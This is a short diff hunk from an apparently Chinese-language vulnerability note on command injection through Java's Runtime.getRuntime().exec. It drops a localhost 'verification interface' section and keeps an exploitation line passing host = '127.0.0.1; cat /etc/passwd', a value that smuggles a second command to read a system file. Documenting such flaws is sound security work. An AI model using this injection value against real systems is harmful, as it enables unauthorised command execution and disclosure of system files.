@@ -30,12 +30,7 @@ Runtime.getRuntime().exec(cmd);
 
 ### 利用方式
 
-
 传入 host = "127.0.0.1; cat /etc/passwd"
-
-### 验证接口
-
-`http://127.0.0.1:8080`
 
 ### payload
 
